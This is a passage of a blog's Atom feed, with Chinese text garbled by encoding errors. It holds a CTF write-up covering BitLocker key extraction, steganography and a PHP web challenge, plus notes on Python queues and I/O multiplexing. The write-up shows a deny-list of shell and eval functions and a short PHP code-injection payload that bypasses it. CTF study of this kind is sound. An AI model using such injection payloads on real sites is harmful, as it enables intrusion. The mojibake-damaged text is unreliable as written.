all the required locking semantics.</p><p>The module implements three types of queue, which differ only in the order in which the entries are retrieved.  In a FIFO queue, the first tasks added are the first retrieved. In a LIFO queue, the most recently added entry is the first retrieved (operating like a stack).  With a priority queue, the entries are kept sorted (using the <a href="https://docs.python.org/3/library/heapq.html#module-heapq"><code>heapq</code></a> module) and the lowest valued entry is retrieved first.</p><p>Internally, those three types of queues use locks to temporarily block competing threads; however, they are not designed to handle reentrancy within a thread.</p><p>In addition, the module implements a â€œsimpleâ€ FIFO queue type, <a href="https://docs.python.org/3/library/queue.html#queue.SimpleQueue"><code>SimpleQueue</code></a>, whose specific implementation provides additional guarantees in exchange for the smaller functionality.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;2-1-ä»€ä¹ˆæ˜¯çº¿ç¨‹&quot;&gt;&lt;a href=&quot;#2-1-ä»€ä¹ˆæ˜¯çº¿ç¨‹&quot; class=&quot;headerlink&quot; title=&quot;2-1 ä»€ä¹ˆæ˜¯çº¿ç¨‹&quot;&gt;&lt;/a&gt;2-1 ä»€ä¹ˆæ˜¯çº¿ç¨‹&lt;/h3&gt;&lt;p&gt;åšå®¢ä¹‹å‰æœ‰ç¯‡æ–‡ç« æµ…æ˜¾çš„è®²äº†ä¸€ä¸‹çº¿ç¨‹æ˜¯å•¥ï¼Œå¯ä»¥å‚è€ƒå¾€æœŸã€‚è¿™é‡Œä¸åšè¿‡å¤šèµ˜è¿°ã€‚çº¿ç¨‹ç”±ä¸‰ä¸ªå…ƒ</summary>
      
    
    
    
    <category term="Pythonå­¦ä¹ " scheme="https://zwh-china.github.io/categories/Python%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>çº¢å¸½æ¯wp</title>
    <link href="https://zwh-china.github.io/2021/05/14/%E7%BA%A2%E5%B8%BD%E6%9D%AF/"/>
    <id>https://zwh-china.github.io/2021/05/14/%E7%BA%A2%E5%B8%BD%E6%9D%AF/</id>
    <published>2021-05-14T12:43:47.000Z</published>
    <updated>2021-05-16T08:47:20.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="è“å¸½æ¯"><a href="#è“å¸½æ¯" class="headerlink" title="è“å¸½æ¯"></a>è“å¸½æ¯</h1><h2 id="Misc-bitlocker-å«Œç–‘äººXçš„ç¡¬ç›˜"><a href="#Misc-bitlocker-å«Œç–‘äººXçš„ç¡¬ç›˜" class="headerlink" title="Misc bitlocker å«Œç–‘äººXçš„ç¡¬ç›˜"></a>Misc bitlocker å«Œç–‘äººXçš„ç¡¬ç›˜</h2><p>é‡åˆ°bitlockerï¼Œæˆ‘ç›®å‰é‡åˆ°çš„ä¸¤ç±»é¢˜å‹ã€‚é€šè¿‡è½¯ä»¶çˆ†ç ´å¯†ç ï¼Œæˆ–è€…é€šè¿‡diskgeniusæ¥å¾—åˆ°éšè—åˆ†åŒºè¡¨ï¼Œæˆ–è€…çœ‹åˆ°éšè—åˆ†åŒºå†…å®¹ã€‚ä¹Ÿå¯èƒ½æ˜¯é€šè¿‡diskgeniusæ¥è¿˜åŸä¸¢å¤±æ–‡ä»¶ã€‚è¿™é¢˜éœ€è¦ä½¿ç”¨åè€…é‡å»ºåˆ†åŒºè¡¨å¾—åˆ°bitlockeræ¢å¤å¯†é’¥åˆ†åŒº</p><p><img src="/2021/05/14/%E7%BA%A2%E5%B8%BD%E6%9D%AF/640.png" alt="640">å®˜æ–¹wpç»™çš„ä¸€ä¸ªæ–¹æ³•æ˜¯ï¼Œéƒ¨åˆ†bitlockeråŠ å¯†æ—¶ä¼šç”Ÿæˆæ¢å¤å¯†é’¥ä¸²ï¼Œæ¯6ä½æ•°å­—ä¸€ç»„ï¼ŒåŠ ä¸Šæ¨ªæ æ­£å¥½55ä½å­—ç¬¦ã€‚48ä¸ªæ•°å­—ï¼Œ7ä¸ªæ¨ªæ ã€‚åŠ ä¹‹æŸ¥çœ‹è®¡ç®—æœºç®¡ç†-ç£ç›˜ç®¡ç†ã€‚å‘ç°å­˜åœ¨ç€æœªåˆ†é…ç©ºé—´ï¼ŒçŒœæƒ³å­˜åœ¨å¯†é’¥ã€‚æ‰€ä»¥å†™ä¸ªPythonè„šæœ¬æå–ã€‚è¿™é‡Œçš„expåº”è¯¥æ˜¯é€šç”¨çš„ã€‚å› æ­¤åœ¨æ­¤å¤„è®°å½•ä¸€ä¸‹</p><pre><code class="python">from re import *def getBitLockerpwd():    with open(&#39;./xxx.vmdk&#39;,&#39;rb&#39;) as f:        info = f.read()    info = info.replace(&#39;\x00&#39;,&#39;&#39;)    reg = compile(r&#39;[0-9_-]&#123;55&#125;&#39;)    print(reg.findall(info))</code></pre><h2 id="Misc-å†¬å¥¥ä¼š-is-coming"><a href="#Misc-å†¬å¥¥ä¼š-is-coming" class="headerlink" title="Misc å†¬å¥¥ä¼š_is_coming"></a>Misc å†¬å¥¥ä¼š_is_coming</h2><p><img src="/2021/05/14/%E7%BA%A2%E5%B8%BD%E6%9D%AF/%E5%86%B0%E5%A2%A9%E5%A2%A9.png" alt="å†°å¢©å¢©"></p><p>æ‹¿åˆ°é™„ä»¶å›¾ç‰‡ã€‚åæ‰‹binwalkã€‚åˆ†ç†å‡ºä¸‰ä¸ªæ–‡ä»¶</p><p><img src="/2021/05/14/%E7%BA%A2%E5%B8%BD%E6%9D%AF/image-20210511210207441.png" alt="image-20210511210207441"></p><p>æ‰“å¼€ç¬¬ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œå‘ç°</p><p><img src="/2021/05/14/%E7%BA%A2%E5%B8%BD%E6%9D%AF/image-20210511210251495.png" alt="image-20210511210251495"></p><p>å³ä¾§æç¤º8ä¸ªæ•°å­—ã€‚ç»“åˆéŸ³é¢‘è€ƒè™‘éŸ³é¢‘éšå†™ã€‚</p><p>å¤ç°å¥½åƒæ‰¾åˆ°äº†ä¸ªæŒºç‰›çš„toolkit<code>https://github.com/DominicBreuker/stego-toolkit</code></p><p>ç»“åˆé¢˜ç›®ï¼ŒçŒœæµ‹8ä½å¯†ç æ˜¯2022åŒ—äº¬å†¬å¥¥ä¼šæ—¥æœŸå³20220204ã€‚ä½¿ç”¨mp3stegoè§£å¯†</p><pre><code>\xe2\x9c\x8c\xef\xb8\x8e \xe2\x98\x9d\xef\xb8\x8e\xe2\x99\x93\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e\xe2\x98\x9f\xef\xb8\x8e\xe2\x97\x86\xef\xb8\x8e\xe2\x99\x8c\xef\xb8\x8e \xe2\x9d\x92\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\x97\xbb\xef\xb8\x8e\xe2\x96\xa1\xef\xb8\x8e\xe2\xac\xa7\xef\xb8\x8e\xe2\x99\x93\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e\xe2\x96\xa1\xef\xb8\x8e\xe2\x9d\x92\xef\xb8\x8e\xe2\x8d\x93\xef\xb8\x8e \xe2\x96\xa0\xef\xb8\x8e\xe2\x99\x8b\xef\xb8\x8e\xe2\x9d\x8d\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\x99\x8e\xef\xb8\x8e \xf0\x9f\x93\x82\xef\xb8\x8e\xe2\x99\x8d\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xf0\x9f\x8f\xb1\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\x99\x8b\xef\xb8\x8e\xf0\x9f\x99\xb5 \xe2\x99\x93\xef\xb8\x8e\xe2\xac\xa7\xef\xb8\x8e \xe2\x9d\x96\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\x9d\x92\xef\xb8\x8e\xe2\x8d\x93\xef\xb8\x8e \xe2\x99\x93\xef\xb8\x8e\xe2\x96\xa0\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\x9d\x92\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\xac\xa7\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e\xe2\x99\x93\xef\xb8\x8e\xe2\x96\xa0\xef\xb8\x8e\xe2\x99\x91\xef\xb8\x8e\xf0\x9f\x93\xac\xef\xb8\x8e \xf0\x9f\x95\x88\xef\xb8\x8e\xe2\x99\x92\xef\xb8\x8e\xe2\x8d\x93\xef\xb8\x8e \xe2\x96\xa0\xef\xb8\x8e\xe2\x96\xa1\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e \xe2\xa7\xab\xef\xb8\x8e\xe2\x99\x8b\xef\xb8\x8e\xf0\x9f\x99\xb5\xe2\x99\x8f\xef\xb8\x8e \xe2\x99\x8b\xef\xb8\x8e \xe2\x97\x8f\xef\xb8\x8e\xe2\x96\xa1\xef\xb8\x8e\xe2\x96\xa1\xef\xb8\x8e\xf0\x9f\x99\xb5 \xe2\x99\x8b\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e \xe2\x99\x93\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e\xe2\x9c\x8d\xef\xb8\x8e</code></pre><p>æ­¤ä¸ºUTF-8ç¼–ç ï¼Œè€ƒè™‘ç”¨pyå°†å…¶è§£æä¸ºunicodeæ˜¾ç¤ºã€‚å°†å†…å®¹å­˜å‚¨è‡³bytesæ•°ç»„ã€‚å†decode utf-8å³å¯å¾—åˆ°ä»¥ä¸‹å†…å®¹</p><pre><code>âœŒï¸ â˜ï¸â™“ï¸â§«ï¸â˜Ÿï¸â—†ï¸â™Œï¸ â’ï¸â™ï¸â—»ï¸â–¡ï¸â¬§ï¸â™“ï¸â§«ï¸â–¡ï¸â’ï¸â“ï¸ â– ï¸â™‹ï¸âï¸â™ï¸â™ï¸ ğŸ“‚ï¸â™ï¸â™ï¸ğŸ±ï¸â™ï¸â™‹ï¸ğŸ™µ â™“ï¸â¬§ï¸ â–ï¸â™ï¸â’ï¸â“ï¸ â™“ï¸â– ï¸â§«ï¸â™ï¸â’ï¸â™ï¸â¬§ï¸â§«ï¸â™“ï¸â– ï¸â™‘ï¸ğŸ“¬ï¸ ğŸ•ˆï¸â™’ï¸â“ï¸ â– ï¸â–¡ï¸â§«ï¸ â§«ï¸â™‹ï¸ğŸ™µâ™ï¸â™‹ï¸ â—ï¸â–¡ï¸â–¡ï¸ğŸ™µ â™‹ï¸â§«ï¸ â™“ï¸â§«ï¸âœï¸</code></pre><p>æ ¹æ®ç»éªŒå’Œæœç´¢ç¡®å®šè¯¥å­—ä½“ä¸ºæ‰€è°“WINGDINGå­—ä½“</p><p><img src="/2021/05/14/%E7%BA%A2%E5%B8%BD%E6%9D%AF/image-20210512203305798.png" alt="image-20210512203305798"></p><p>ç½‘å€ä¸º<code>https://lingojam.com/WingDing</code>å³å¯åœ¨çº¿è½¬ç </p><pre><code>ğŸ™ƒğŸ’µğŸŒ¿ğŸ¤ğŸšªğŸŒğŸğŸ¥‹ğŸš«ğŸ˜†ğŸƒâœ…âŒ¨ğŸ”ªâ“ğŸš«ğŸğŸ™ƒğŸ”¬âœ‰ğŸ‘ğŸ˜†ğŸˆğŸ˜ğŸğŸ˜ğŸ˜ğŸ˜‚ğŸ˜ğŸ…ğŸ–ğŸâœ‰ğŸŒğŸŒªğŸğŸµâœ…ğŸšªâœ–â˜ƒğŸ‘£ğŸ‘‰â„¹ğŸ”ªğŸğŸ”„ğŸ‘£ğŸšªğŸ˜ğŸ‘£ğŸ’µğŸ…ğŸµğŸ”¬ğŸ›©ğŸ˜‡ğŸ–ğŸ–ğŸ…âœ…ğŸğŸ‘ŒğŸš¨ğŸ˜†ğŸ¤ğŸ…ğŸ¦“ğŸŒ¿ğŸ¦“ğŸ™ƒâœ–ğŸŒğŸ›©ğŸ˜‚ğŸ‘‘ğŸŒâ˜ƒğŸ˜‡ğŸ˜ğŸ›©ğŸš¹ğŸ˜€ğŸŒğŸˆğŸ’§ğŸ—’ğŸ—’</code></pre><p>è¿™æ³¢ç¼–ç ç›´æ¥æŠŠæˆ‘æ™•æ­»</p><p>å»ä½œè€…githubä»“åº“æ‰¾åˆ°å¯†é’¥</p><p><code>How_6ad_c0uld_a_1cePeak_be?</code>ç»“åˆemojiè€ƒè™‘emoji-aes</p><p><a href="https://aghorler.github.io/emoji-aes/">https://aghorler.github.io/emoji-aes/</a></p><p>å¾—åˆ°flag<code>flag&#123;e32f619b-dbcd-49bd-9126-5d841aa01767&#125;</code></p><h3 id="é¢˜å¤–ä¹‹éŸ³"><a href="#é¢˜å¤–ä¹‹éŸ³" class="headerlink" title="é¢˜å¤–ä¹‹éŸ³"></a>é¢˜å¤–ä¹‹éŸ³</h3><ul><li><p>ASCII UTF-8 Unicodeçš„å…³ç³»å’ŒåŒºåˆ«</p><p>UTF-8æ˜¯Unicodeçš„ä¸€ç§å®ç°æ–¹å¼ï¼ŒUnicodeåªè§„å®šäº†æ¯ä¸ªç¬¦å·çš„ç¼–ç ï¼Œå´æ²¡æœ‰è§„å®šå¦‚ä½•å­˜å‚¨ã€‚è€ŒUTF-8åˆ™è§„å®šå…¶å…·ä½“è¡¨ç¤ºæ–¹å¼ï¼Œå³å¯å˜é•¿ç¼–ç æ–¹å¼1-4å­—èŠ‚è¡¨ç¤ºä¸€ç§ç¬¦å·ã€‚ä¾‹å¦‚ä¸­æ–‡ä¸­çš„â€™ä¸¥â€˜çš„Unicodeç¼–ç æ˜¯<code>4E25</code>ï¼ŒUTF-8ç¼–ç åˆ™ä¸º<code>E4B8A5</code>,æœ€ç®€å•çš„ï¼Œé€šè¿‡txtå¦å­˜ä¸ºæ—¶æ”¹å˜å­˜å‚¨ç¼–ç å³å¯ç®€å•çš„è¿›è¡ŒUTF-8å’ŒUnicodeç¼–ç ä¹‹é—´çš„è½¬æ¢ã€‚é™¤äº†UTF-8è¿˜æœ‰UTF-16,UTF-32ã€‚å…¶ä¸åŒåœ¨äºå­—ç¬¦ç”¨å‡ ä¸ªå­—èŠ‚è¡¨ç¤ºã€‚</p><p>è‡³äºASCIIï¼Œæ˜¯ä¸Šä¸–çºª60å¹´ä»£ï¼Œç¾å›½åˆ¶å®šçš„ä¸€å¥—å­—ç¬¦ç¼–ç ï¼Œå¯¹è‹±è¯­å’ŒäºŒè¿›åˆ¶ä½ä¹‹é—´çš„å…³ç³»åšäº†ç»Ÿä¸€è§„å®šã€‚ä¸€å…±è§„å®šäº†128ä¸ªç¬¦å·ã€‚åŒ…å«32ä¸ªä¸å¯è§çš„æ§åˆ¶å­—ç¬¦ã€‚å…¶åªå ç”¨1Byteä¸­8bitçš„å7ä½ç¬¬ä¸€ä½ç»Ÿä¸€è§„å®šç”¨0å¡«å……ã€‚</p></li></ul><h1 id="çº¢å¸½æ¯"><a href="#çº¢å¸½æ¯" class="headerlink" title="çº¢å¸½æ¯"></a>çº¢å¸½æ¯</h1><h2 id="misc-ç­¾åˆ°"><a href="#misc-ç­¾åˆ°" class="headerlink" title="misc ç­¾åˆ°"></a>misc ç­¾åˆ°</h2><p>flagè¢«EBCDICç¼–ç ã€‚ä½¿ç”¨ultraedit-&gt;é«˜çº§-&gt;ç¼–ç å³å¯è½¬æ¢ä¸ºflag</p><h2 id="web-find-it"><a href="#web-find-it" class="headerlink" title="web find_it"></a>web find_it</h2><p>è®¿é—®robots.txtå¾—åˆ°<code>1ndexx.php</code>ç›´æ¥è®¿é—®æ²¡ä¸œè¥¿ã€‚ç»“åˆä¹‹å‰ä¸€é“é¢˜power_offçŒœæµ‹å¯èƒ½æ˜¯vimä¸´æ—¶æ–‡ä»¶ä¸€ç±»ã€‚è®¿é—®<code>.1ndexx.php.swp</code>å¾—åˆ°æºç </p><pre><code class="PHP">&lt;?php $link = mysql_connect(&#39;localhost&#39;, &#39;root&#39;); ?&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;Hello worldd!&lt;/title&gt;    &lt;style&gt;    body &#123;        background-color: white;        text-align: center;        padding: 50px;        font-family: &quot;Open Sans&quot;,&quot;Helvetica Neue&quot;,Helvetica,Arial,sans-serif;    &#125;    #logo &#123;        margin-bottom: 40px;    &#125;    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;img id=&quot;logo&quot; src=&quot;logo.png&quot; /&gt;    &lt;h1&gt;&lt;?php echo &quot;Hello My freind!&quot;; ?&gt;&lt;/h1&gt;    &lt;?php if($link) &#123; ?&gt;        &lt;h2&gt;I Can&#39;t view my php files?!&lt;/h2&gt;    &lt;?php &#125; else &#123; ?&gt;        &lt;h2&gt;MySQL Server version: &lt;?php echo mysql_get_server_info(); ?&gt;&lt;/h2&gt;    &lt;?php &#125; ?&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php#Really easy...$file=fopen(&quot;flag.php&quot;,&quot;r&quot;) or die(&quot;Unable 2 open!&quot;);$I_know_you_wanna_but_i_will_not_give_you_hhh = fread($file,filesize(&quot;flag.php&quot;));$hack=fopen(&quot;hack.php&quot;,&quot;w&quot;) or die(&quot;Unable 2 open&quot;);$a=$_GET[&#39;code&#39;];if(preg_match(&#39;/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\\~|\\^|\\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/&#39;,$a))&#123;    die(&quot;you die&quot;);&#125;if(strlen($a)&gt;33)&#123;    die(&quot;nonono.&quot;);&#125;fwrite($hack,$a);fwrite($hack,$I_know_you_wanna_but_i_will_not_give_you_hhh);fclose($file);fclose($hack);?&gt;</code></pre><p>ä¼šåœ¨è¿‡æ»¤åï¼ŒæŠŠgetåˆ°çš„å†…å®¹è¯»å–åˆ°<code>hack.php</code>è¿™é‡Œæ„å¤–ç”¨<code>/index.php?code=&lt;?=phpinfo();?&gt;</code>è®¿é—®<code>phpinfo</code>è¯»åˆ°flag</p><h2 id="misc-colorfulcode"><a href="#misc-colorfulcode" class="headerlink" title="misc colorfulcode"></a>misc colorfulcode</h2><p>è¿™é¢˜ä¸‹æ¥å°±ä¿©æ–‡ä»¶ï¼Œä¸€ä¸ªdata1ï¼Œä¸€ä¸ªdata2.å…¶ä¸­data1ä¸º</p><p><img src="/2021/05/14/%E7%BA%A2%E5%B8%BD%E6%9D%AF/image-20210514040025916.png" alt="image-20210514040025916"></p><p>ç®€ç›´æ¯«æ— å¤´ç»ª</p><p>data2</p><p><img src="/2021/05/14/%E7%BA%A2%E5%B8%BD%E6%9D%AF/image-20210514040143683.png" alt="image-20210514040143683"></p><p>å…¶å®è¯´æ˜¯åœ¨ã€‚è¿™ç©æ„ç®€ç›´çœ‹ä¸å‡ºæ¥ã€‚çœ‹äº†é¢˜è§£æ‰çŸ¥é“å’‹åšã€‚ç¬¬äºŒä¸ªåéƒ¨åˆ†å¤§éƒ¨åˆ†ä¸ºä¸‰ä¸ªé‡å¤ç›¸åŒæ•°æ®ã€‚è€ƒè™‘å¯èƒ½ä¸ºrgbæ•°æ®ã€‚å°†å…¶æŒ¨ä¸ªæå–ï¼Œè½¬æ¢ä¸º16è¿›åˆ¶ã€‚å†æ ¹æ®data1çš„æ•°å­—ï¼Œæ•°å­—è¡¨ç¤ºå¯¹åº”åƒç´ ä¸‹æ ‡ã€‚ç„¶åæå–data2åƒç´ æ ¹æ®data1æ•°é‡ï¼Œè´¨å› æ•°åˆ†è§£æ¨æµ‹å‡ºå›¾ç‰‡é•¿é«˜ï¼Œè¿›è€Œè¿˜åŸã€‚</p><pre><code class="python">import binasciifrom PIL import Imagef_data1 = open(&#39;./data1&#39;,&#39;r&#39;).read()data1 = f_data1.split(&#39; &#39;)[:-1]with open(&#39;./data2&#39;,mode=&#39;rb&#39;) as f:    #print(f.read())    #print(binascii.hexlify(f.read()))    # data=binascii.hexlify(f.read()).decode()    data = f.read()    print(data)    rgb = []    for i in range(0, len(data), 3):        r = data[i]        g = data[i + 1]        b = data[i + 2]        rgb.append ((r, g, b))print(rgb)img = Image.new(&#39;RGB&#39;,(37,191),(255,255,255))for i in range(37):    for j in range(191):        img.putpixel((i,j),rgb[int(data1[i*191+j])])img.show()img.save(&#39;flag.png&#39;)</code></pre><img src="/2021/05/14/%E7%BA%A2%E5%B8%BD%E6%9D%AF/flag.png" alt="flag" style="zoom:200%;"><p>è¿™éƒ¨å¦‚æœè¿˜åŸå‡ºæ¥ï¼Œæ˜æ˜¾æ„Ÿè§‰æœ‰ä¸œè¥¿ã€‚ä½†æ˜¯è¿˜æ˜¯æ²¡æ³•å¾—åˆ°flagã€‚éœ€è¦çŸ¥é“ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼Œå°±æ˜¯Colorful programmingã€‚å°†æ­¤å›¾ç‰‡ä¸Šä¼ è‡³ç½‘ç«™<code>https://www.bertnase.de/npie</code>å³å¯å¾—åˆ°æ•°æ®<code>88842f20-fb8c-45c9-ae8f-36135b6a0f11</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;è“å¸½æ¯&quot;&gt;&lt;a href=&quot;#è“å¸½æ¯&quot; class=&quot;headerlink&quot; title=&quot;è“å¸½æ¯&quot;&gt;&lt;/a&gt;è“å¸½æ¯&lt;/h1&gt;&lt;h2 id=&quot;Misc-bitlocker-å«Œç–‘äººXçš„ç¡¬ç›˜&quot;&gt;&lt;a href=&quot;#Misc-bitlocker-å«Œç–‘äººXçš„ç¡¬ç›˜&quot; cla</summary>
      
    
    
    
    <category term="æˆ‘ä¸ä¸ºäººçŸ¥çš„æ—¥å¸¸" scheme="https://zwh-china.github.io/categories/%E6%88%91%E4%B8%8D%E4%B8%BA%E4%BA%BA%E7%9F%A5%E7%9A%84%E6%97%A5%E5%B8%B8/"/>
    
    
  </entry>
  
  <entry>
    <title>python IOå¤šè·¯å¤ç”¨</title>
    <link href="https://zwh-china.github.io/2021/05/03/python%20IO%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8/"/>
    <id>https://zwh-china.github.io/2021/05/03/python%20IO%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8/</id>
    <published>2021-05-02T17:56:29.000Z</published>
    <updated>2021-05-02T18:00:25.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ€è¿‘æ­£åœ¨å†™ä¸€ä¸ªç«¯å£æ˜ å°„å°ç¨‹åºã€‚ä¸»è¦å®ç°å†…ç½‘çš„ç«¯å£è½¬å‘åŠŸèƒ½ã€‚æ‹¿80ç«¯å£çš„Apacheä¸¾ä¾‹æ¥è¯´ï¼Œå°±æ˜¯æˆ‘åœ¨ä¸€ä¸ªæ²¡æœ‰å…¬ç½‘IPçš„å†…ç½‘å»ºç«‹äº†ä¸€ä¸ªApacheæœåŠ¡å™¨ï¼Œä½†æ˜¯è¿™ä¸ªwebæœåŠ¡åªèƒ½è¢«å†…ç½‘è®¿é—®ï¼Œä½†æ˜¯é€šè¿‡ç«¯å£æ˜ å°„å°±èƒ½å¤Ÿé€šè¿‡æœ‰å…¬ç½‘IPçš„æœåŠ¡å™¨è®¿é—®åˆ°æœ¬åœ°çš„80ç«¯å£æœåŠ¡</p><p>å¤§æ¦‚åŸç†å°±æ˜¯å†™äº†ä¸€ä¸ªåå‘ä»£ç†ï¼Œé€šè¿‡åä»£æ•°æ®æ¥è¾¾åˆ°ç«¯å£æ˜ å°„çš„æ•ˆæœã€‚ä½†æ˜¯è¿™ç§åœºæ™¯ä¸‹å•ä¸€çš„å¤šçº¿ç¨‹å·²ç»æ»¡è¶³ä¸äº†æˆ‘å¯¹æ€§èƒ½çš„è¦æ±‚ï¼Œè¿›è€Œæˆ‘å»äº†è§£äº†UNIXä¸‹çš„äº”ç§I/Oæ¨¡å‹ï¼Œå‡†å¤‡æ‹¿I/Oå¤šè·¯å¤ç”¨çš„epollæ¥è§£å†³æˆ‘çš„é—®é¢˜</p><p>æœ€åˆçš„æ„æƒ³æ˜¯ï¼Œå½“æœåŠ¡å™¨æ¥åˆ°ä¸€ä¸ªè¯·æ±‚ï¼Œå®¢æˆ·ç«¯å°±ä¼šå¼€ä¸€ä¸ªå¥—æ¥å­—å¹¶æŠŠå…¶æ”¾å…¥ä¸€ä¸ªçº¿ç¨‹å»å¤„ç†ã€‚ç›¸å½“äºæ¯æœ‰ä¸€ä¸ªè¿æ¥ï¼Œæˆ‘å°±ä¼šå•ç‹¬å¼€ä¸€ä¸ªçº¿ç¨‹ã€‚è¿™æ ·ä¼šä½¿å¾—ç¨‹åºçš„æ•ˆç‡å¤§å¤§ä¸‹é™ã€‚å› ä¸ºåœ¨åˆ›å»ºæ–°çº¿ç¨‹æ—¶ä¼šæ¶‰åŠåˆ°ä¸Šä¸‹æ–‡åˆ‡æ¢å’Œå†…å­˜çš„å…±äº«ã€‚æ‰€ä»¥æˆ‘éœ€è¦é™¤äº†çº¿ç¨‹å¤–çš„æ–¹æ³•æ¥è§£å†³è¿™ä¸ªé—®é¢˜</p><h2 id="Unixä¸‹äº”å¤§I-Oæ¨¡å‹"><a href="#Unixä¸‹äº”å¤§I-Oæ¨¡å‹" class="headerlink" title="Unixä¸‹äº”å¤§I/Oæ¨¡å‹"></a>Unixä¸‹äº”å¤§I/Oæ¨¡å‹</h2><ul><li><p>Blocking I/O </p></li><li><p>Non-blocking I/O </p></li><li><p>I/O multiplexing (select/poll/epoll) </p></li><li><p>Signal-driven (Sigio) </p></li><li><p>Asynchronous I/O (POSIX aio_ series functions) <img src="/2021/05/03/python%20IO%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8/yuque_diagram.png" alt="yuque_diagram"></p></li></ul><h3 id="é˜»å¡å¼IO"><a href="#é˜»å¡å¼IO" class="headerlink" title="é˜»å¡å¼IO"></a>é˜»å¡å¼IO</h3><p>é˜»å¡å¼å°±æ˜¯æœ€å¸¸è§çš„socketç”¨æ³•ã€‚</p><pre><code class="python">data = skt.recv(Buffer_Size)</code></pre><p>è¿™ç§æ¥æ”¶é»˜è®¤ä¸‹æ˜¯é˜»å¡çš„ï¼Œåœ¨è¿è¡Œåˆ°è¿™ä¸ªå‡½æ•°åä¼šæ‰§è¡Œç³»ç»Ÿè°ƒç”¨ï¼Œå³ä»ç”¨æˆ·æ€åˆ°å†…æ ¸æ€çš„è½¬æ¢ã€‚æ­¤æ—¶å°±ä¼šé˜»å¡ç­‰åˆ°å†…æ ¸è¿”å›æ•°æ®å†…å®¹ã€‚</p><h3 id="éé˜»å¡å¼IO"><a href="#éé˜»å¡å¼IO" class="headerlink" title="éé˜»å¡å¼IO"></a>éé˜»å¡å¼IO</h3><p>éé˜»å¡å³è®¾ç½®<code>skt.setblocking(True)</code>æ­¤æ—¶å¥—æ¥å­—ä¾¿ä¸ä¼šé˜»å¡ã€‚åœ¨æ¯æ¬¡å°è¯•<code>recv(Buffer_Size)</code>æ—¶å›å»é—®å†…æ ¸æœ‰æ²¡æœ‰æ•°æ®ï¼Œæ²¡æœ‰æ•°æ®å†…æ ¸ä¼šè¿”å›é”™è¯¯ï¼Œè€Œä¸æ˜¯ç­‰å¾…æ•°æ®åˆ°æ¥</p><h3 id="å¤šè·¯å¤ç”¨IO"><a href="#å¤šè·¯å¤ç”¨IO" class="headerlink" title="å¤šè·¯å¤ç”¨IO"></a>å¤šè·¯å¤ç”¨IO</h3><p>è¿™ä¸ªæ˜¯è¿™æ¬¡äº†è§£çš„é‡ç‚¹ã€‚</p><h2 id="select"><a href="#select" class="headerlink" title="select"></a>select</h2><ul><li>select( )</li></ul><p><code>select</code>åœ¨pythonä¸­çš„å®šä¹‰æ˜¯<code>select.select(rlist, wlist, xlist[,timeout])</code>è¿™ä¸ªå‡½æ•°æä¾›äº†ç›´æ¥é¢å‘Unixç³»ç»Ÿä¸­<code>select()</code>ç³»ç»Ÿè°ƒç”¨çš„æ¥å£ï¼Œå…¶ä¸­å‰ä¸‰ä¸ªå‚æ•°æ˜¯ç­‰å¾…å¯¹è±¡çš„</p><pre><code>iterable: either integers representing file descriptors or objects with a parameterless method named fileno() returning such an integer:    rlist: wait until ready for reading    wlist: wait until ready for writing    xlist: wait for an â€œexceptional conditionâ€ (see the manual page for what your system considers such a condition)Empty iterables are allowed, but acceptance of three empty iterables is platform-dependent. (It is known to work on Unix but not on Windows.) The optional timeout argument specifies a time-out as a floating point number in seconds. When the timeout argument is omitted the function blocks until at least one file descriptor is ready. A time-out value of zero specifies a poll and never blocks.The return value is a triple of lists of objects that are ready: subsets of the first three arguments. When the time-out is reached without a file descriptor becoming ready, three empty lists are returned.Among the acceptable object types in the iterables are Python file objects (e.g. sys.stdin, or objects returned by open() or os.popen()), socket objects returned by socket.socket(). You may also define a wrapper class yourself, as long as it has an appropriate fileno() method (that really returns a file descriptor, not just a random integer).NoteFile objects on Windows are not acceptable, but sockets are. On Windows, the underlying select() function is provided by the WinSock library, and does not handle file descriptors that donâ€™t originate from WinSock. </code></pre><p>è¯´ç™½äº†å°±æ˜¯æ–‡ä»¶æè¿°ç¬¦<code>fd</code>ï¼Œå½“ç„¶ç”±äºPythonå°è£…çš„ç‰¹æ€§ï¼Œä¹Ÿå¯ä»¥ä¼ 